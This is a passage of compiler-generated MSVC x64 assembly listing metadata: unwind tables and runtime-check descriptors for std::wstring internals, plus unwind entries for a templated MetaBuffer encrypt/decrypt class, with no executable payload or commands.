	DD	imagerel __GSHandlerCheck
	DD	0208H
xdata	ENDS
;	COMDAT CONST
CONST	SEGMENT
??$_Reallocate_grow_by@V<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??append@01@QEAAAEAV01@QEB_W0@Z@PEB_W_K@Z$rtcName$0 DB 05fH ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_grow_by<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::append'::`2'::<lambda_1>,wchar_t const *,unsigned __int64>
	DB	04eH
	DB	065H
	DB	077H
	DB	05fH
	DB	063H
	DB	061H
	DB	070H
	DB	061H
	DB	063H
	DB	069H
	DB	074H
	DB	079H
	DB	00H
	ORG $+2
??$_Reallocate_grow_by@V<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??append@01@QEAAAEAV01@QEB_W0@Z@PEB_W_K@Z$rtcName$1 DB 05fH ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_grow_by<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::append'::`2'::<lambda_1>,wchar_t const *,unsigned __int64>
	DB	04eH
	DB	065H
	DB	077H
	DB	05fH
	DB	070H
	DB	074H
	DB	072H
	DB	00H
	ORG $+7
??$_Reallocate_grow_by@V<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??append@01@QEAAAEAV01@QEB_W0@Z@PEB_W_K@Z$rtcVarDesc DD 0f8H ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_grow_by<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::append'::`2'::<lambda_1>,wchar_t const *,unsigned __int64>
	DD	08H
	DQ	FLAT:??$_Reallocate_grow_by@V<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??append@01@QEAAAEAV01@QEB_W0@Z@PEB_W_K@Z$rtcName$1
	DD	0b8H
	DD	08H
	DQ	FLAT:??$_Reallocate_grow_by@V<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??append@01@QEAAAEAV01@QEB_W0@Z@PEB_W_K@Z$rtcName$0
	ORG $+96
??$_Reallocate_grow_by@V<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??append@01@QEAAAEAV01@QEB_W0@Z@PEB_W_K@Z$rtcFrameData DD 02H ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_grow_by<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::append'::`2'::<lambda_1>,wchar_t const *,unsigned __int64>
	DD	00H
	DQ	FLAT:??$_Reallocate_grow_by@V<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??append@01@QEAAAEAV01@QEB_W0@Z@PEB_W_K@Z$rtcVarDesc
CONST	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??R<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W0101@Z DD 025052201H
	DD	011d2322H
	DD	070160021H
	DD	05015H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z DD 025051801H
	DD	01132318H
	DD	0700c0021H
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z DD 025051801H
	DD	01132318H
	DD	0700c0021H
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$min@_K@std@@YAAEB_KAEB_K0@Z DD 025051801H
	DD	01132318H
	DD	0700c0021H
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$max@_K@std@@YAAEB_KAEB_K0@Z DD 025051801H
	DD	01132318H
	DD	0700c0021H
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Destroy_in_place@PEA_W@std@@YAXAEAPEA_W@Z DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Construct_in_place@PEA_WAEAPEA_W@std@@YAXAEAPEA_W0@Z DD 025051801H
	DD	01132318H
	DD	0700c0021H
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$addressof@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@YAPEAV?$_String_val@U?$_Simple_types@_W@std@@@0@AEAV10@@Z DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	045H
	DW	016dH
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z DD 025054c19H
	DD	011d2322H
	DD	07016002dH
	DD	05015H
	DD	imagerel __GSHandlerCheck
	DD	0158H
xdata	ENDS
;	COMDAT CONST
CONST	SEGMENT
??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z$rtcName$0 DB 05fH ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_for<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>,wchar_t const *>
	DB	04eH
	DB	065H
	DB	077H
	DB	05fH
	DB	063H
	DB	061H
	DB	070H
	DB	061H
	DB	063H
	DB	069H
	DB	074H
	DB	079H
	DB	00H
	ORG $+2
??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z$rtcName$1 DB 05fH ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_for<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>,wchar_t const *>
	DB	04eH
	DB	065H
	DB	077H
	DB	05fH
	DB	070H
	DB	074H
	DB	072H
	DB	00H
	ORG $+7
??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z$rtcVarDesc DD 088H ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_for<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>,wchar_t const *>
	DD	08H
	DQ	FLAT:??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z$rtcName$1
	DD	048H
	DD	08H
	DQ	FLAT:??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z$rtcName$0
	ORG $+96
??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z$rtcFrameData DD 02H ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_for<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>,wchar_t const *>
	DD	00H
	DQ	FLAT:??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z$rtcVarDesc
CONST	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??R<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W10@Z DD 025052201H
	DD	011d2322H
	DD	070160021H
	DD	05015H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	040H
	DW	01aeH
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z DD 025054719H
	DD	0118231dH
	DD	070110037H
	DD	05010H
	DD	imagerel __GSHandlerCheck
	DD	01a0H
xdata	ENDS
;	COMDAT CONST
CONST	SEGMENT
??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcName$0 DB 05fH ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<2,wchar_t const *>
	DB	050H
	DB	072H
	DB	06fH
	DB	078H
	DB	079H
	DB	00H
	ORG $+1
??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcName$1 DB 05fH ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<2,wchar_t const *>
	DB	04eH
	DB	065H
	DB	077H
	DB	05fH
	DB	063H
	DB	061H
	DB	070H
	DB	061H
	DB	063H
	DB	069H
	DB	074H
	DB	079H
	DB	00H
	ORG $+2
??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcName$2 DB 05fH ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<2,wchar_t const *>
	DB	04eH
	DB	065H
	DB	077H
	DB	05fH
	DB	070H
	DB	074H
	DB	072H
	DB	00H
	ORG $+15
??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcVarDesc DD 0c8H ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<2,wchar_t const *>
	DD	08H
	DQ	FLAT:??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcName$2
	DD	0a8H
	DD	08H
	DQ	FLAT:??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcName$1
	DD	084H
	DD	01H
	DQ	FLAT:??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcName$0
	ORG $+144
??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcFrameData DD 03H ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<2,wchar_t const *>
	DD	00H
	DQ	FLAT:??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcVarDesc
CONST	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	040H
	DW	01f1H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z DD 025054719H
	DD	0118231dH
	DD	07011003dH
	DD	05010H
	DD	imagerel __GSHandlerCheck
	DD	01d8H
xdata	ENDS
;	COMDAT CONST
CONST	SEGMENT
??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcName$0 DB 05fH ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<1,wchar_t const *>
	DB	050H
	DB	072H
	DB	06fH
	DB	078H
	DB	079H
	DB	00H
	ORG $+1
??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcName$1 DB 05fH ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<1,wchar_t const *>
	DB	04eH
	DB	065H
	DB	077H
	DB	05fH
	DB	063H
	DB	061H
	DB	070H
	DB	061H
	DB	063H
	DB	069H
	DB	074H
	DB	079H
	DB	00H
	ORG $+2
??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcName$2 DB 05fH ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<1,wchar_t const *>
	DB	04eH
	DB	065H
	DB	077H
	DB	05fH
	DB	070H
	DB	074H
	DB	072H
	DB	00H
	ORG $+15
??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcVarDesc DD 0c8H ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<1,wchar_t const *>
	DD	08H
	DQ	FLAT:??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcName$2
	DD	0a8H
	DD	08H
	DQ	FLAT:??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcName$1
	DD	084H
	DD	01H
	DQ	FLAT:??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcName$0
	ORG $+144
??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcFrameData DD 03H ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<1,wchar_t const *>
	DD	00H
	DQ	FLAT:??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcVarDesc
CONST	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Convert_size@_K_K@std@@YA_K_K@Z DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$?0V?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@$$QEAV?$allocator@_W@1@@Z DD 025051c01H
	DD	0117231cH
	DD	07010001dH
	DD	0500fH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Pocca@V?$allocator@_W@std@@@std@@YAXAEAV?$allocator@_W@0@AEBV10@@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$addressof@$$CBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@std@@YAPEBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@@Z DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0EJ@$0EB@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0EJ@$0EB@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0EJ@$0EB@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0EJ@$0EB@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0131H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0EJ@$0EB@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0FJ@$0FE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0FJ@$0FE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0FJ@$0FE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0FJ@$0FE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	02bH
	DB	055H
	DB	07fH
	DB	0a9H
	DB	0d3H
	DB	0ddH
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0FJ@$0FE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01f9H
	DW	0223H
	DW	024dH
	DW	0277H
	DW	02a1H
	DW	02cbH
	DW	02f5H
	DW	031fH
	DW	0349H
	DW	0373H
	DW	039dH
	DW	03c7H
	DW	03f1H
	DW	041bH
	DW	0445H
	DW	046fH
	DW	0499H
	DW	04c3H
	DW	04edH
	DW	0517H
	DW	0541H
	DW	056bH
